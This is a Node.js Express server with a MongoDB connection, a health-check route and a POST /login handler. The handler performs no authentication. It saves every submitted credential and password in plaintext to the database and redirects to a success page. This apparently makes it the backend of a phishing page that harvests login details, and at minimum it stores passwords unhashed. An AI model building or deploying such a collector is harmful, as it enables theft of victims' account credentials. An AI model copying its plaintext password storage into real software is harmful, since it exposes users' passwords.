const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');
const config = require('./config');

const app = express();
const PORT = config.PORT;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB Connection with improved options
console.log('Attempting to connect to MongoDB with URI:', config.MONGODB_URI.replace(/:([^:@]+)@/, ':****@')); // Log URI with hidden password

const connectWithRetry = async () => {
  try {
    await mongoose.connect(config.MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
      serverSelectionTimeoutMS: 15000, // Timeout after 15 seconds
      socketTimeoutMS: 45000, // Close sockets after 45 seconds of inactivity
    });
    console.log('MongoDB connection successful');
  } catch (err) {
    console.error('MongoDB connection error:', err.message);
    console.log('Retrying connection in 5 seconds...');
    setTimeout(connectWithRetry, 5000);
  }
};

connectWithRetry();

// Handle MongoDB connection events
mongoose.connection.on('connected', () => {
  console.log('Mongoose connected to MongoDB Atlas');
});

mongoose.connection.on('error', (err) => {
  console.error('Mongoose connection error:', err.message);
});

mongoose.connection.on('disconnected', () => {
  console.log('Mongoose disconnected');
});

// User Schema
const userSchema = new mongoose.Schema({
  credential: {
    type: String,
    required: true
  },
  password: {
    type: String,
    required: true
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

const User = mongoose.model('User', userSchema);

// Simple Health Check Route
app.get('/health', (req, res) => {
  const dbStatus = mongoose.connection.readyState === 1 ? 'Connected' : 'Disconnected';
  res.json({ 
    status: 'ok', 
    db: dbStatus,
    environment: config.NODE_ENV,
    timestamp: new Date().toISOString()
  });
});

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/login', async (req, res) => {
  try {
    // Check if MongoDB is connected
    if (mongoose.connection.readyState !== 1) {
      console.error('MongoDB not connected when trying to save user');
      return res.redirect('/error.html');
    }
    
    const { credential, password } = req.body;
    
    console.log(`Attempting to save user with credential: ${credential.substring(0, 3)}***`);
    
    // Save user credentials to database
    const newUser = new User({
      credential,
      password
    });
    
    await newUser.save();
    console.log('User data saved successfully');
    
    // Redirect to a success page
    res.redirect('/success.html');
  } catch (error) {
    console.error('Error saving user:', error);
    res.redirect('/error.html');
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT} in ${config.NODE_ENV} mode`);
}); 